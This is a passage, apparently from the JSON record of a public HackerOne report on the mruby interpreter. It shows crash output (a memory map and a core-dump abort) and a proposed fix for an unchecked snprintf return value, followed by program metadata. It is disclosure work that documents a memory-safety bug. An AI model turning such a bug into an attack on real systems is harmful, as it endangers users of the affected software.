/XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n</code></pre>\n<h2 id=\"proposed-fix\">Proposed Fix:</h2>\n\n<p>Should check the return value of <code>snprintf</code> for errors, instead of directly using it by adding it to <code>blen</code>.</p>\n", 
+    "severity_rating": "none", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
